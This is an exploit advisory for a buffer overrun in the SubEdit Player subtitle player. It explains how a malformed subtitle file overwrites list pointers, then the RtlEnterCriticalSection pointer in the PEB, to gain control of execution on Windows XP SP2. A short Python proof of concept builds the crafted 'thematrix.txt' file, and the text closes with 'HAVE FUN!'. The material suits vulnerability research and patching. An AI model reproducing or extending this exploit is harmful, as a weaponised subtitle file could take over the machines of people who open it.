|
| SubEdit Player is a very popular player and subtitles    
| editor in Poland. It does not perform any boundery checks         
| on supplied subtitles. This causes buffer overrun and
| throwing access violation exception on group of instructions:
|
|
| 005F7C1E  |. 8902           MOV DWORD PTR DS:[EDX],EAX
| 005F7C20  |. 8950 04        MOV DWORD PTR DS:[EAX+4],EDX
|    
| I thought in first moment that this is heap overflow, but
| why does these instructions appear in subedit module? And
| why on my winxp sp2 computer this is possible? So, I think
| that this program has own kind of dynamically list structure
| and I am able to overwrite its pointers.
|
| Ok so, I am controling EAX and EDX registers. In this
| situation I am able to use technique described by c0ntex
| ( thx mate! ) to overwrite a pointer to RtlEnterCriticalSection
| in PEB structure of ntdll. Thanks to this (after about 30
| access violations when writing - exceptions handlers throw
| exceptions handlers)
| I get:
|
|   
|  {Access violation when executing [42424242]}
|                                 
|  -Tested on Windows Xp sp2 fully patched.

POC:

#!/usr/bin/python

sub = &quot;{4143}{4200}&quot;
sub += &quot;B&quot; * 4098
sub += &quot;\x20\xf0\xfd\x7f&quot;
sub += &quot;A&quot; * 398

fd = open(&quot;thematrix.txt&quot;, &quot;w&quot;)
fd.write(sub)
fd.close()

print &quot;FILE CREATED\nHAVE FUN!&quot;
